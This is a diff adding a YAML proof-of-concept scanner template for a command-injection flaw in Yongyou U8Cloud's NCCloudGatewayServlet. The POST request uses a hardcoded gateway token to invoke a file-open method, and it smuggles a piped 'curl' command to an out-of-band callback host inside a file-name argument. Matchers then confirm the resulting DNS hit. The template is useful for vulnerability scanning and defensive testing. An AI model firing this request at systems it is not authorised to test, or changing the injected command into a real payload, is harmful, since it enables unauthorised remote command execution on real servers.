@@ -1,0 +1,65 @@
+id: poc-yaml-yongyou-u8-cloud-nccloudgatewayservlet-command-injection
+info:
+  name: Yongyou U8Cloud NCCloudGatewayServlet Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog, command-injection
+variables:
+  random: "{{rand_text_alphanumeric(5)}}"
+  reverse: "{{interactsh-url}}"
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/service/NCCloudGatewayServlet"
+    headers:
+      Content-Type: application/json
+      gatewaytoken: TJ6RT-3FVCB-DPYP8-XF7QM-96FV3
+    body: |-
+      {
+        "serviceInfo": {
+          "serviceClassName": "com.ufida.zior.console.IActionInvokeService",
+          "serviceMethodName": "exec",
+          "serviceMethodArgInfo": [
+            {
+              "agg": false,
+              "isArray": false,
+              "isPrimitive": true,
+              "argType": { "body": "java.lang.String" },
+              "argValue": { "body": "nc.bs.pub.util.ProcessFileUtils" }
+            },
+            {
+              "agg": false,
+              "isArray": false,
+              "isPrimitive": true,
+              "argType": { "body": "java.lang.String" },
+              "argValue": { "body": "openFile" }
+            },
+            {
+              "agg": false,
+              "isArray": false,
+              "isPrimitive": false,
+              "argType": { "body": "java.lang.String" },
+              "argValue": {
+                "body": "{{random}}.txt \"|curl https://{{reverse}}\""
+              }
+            }
+          ]
+        }
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"agg":false}'
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
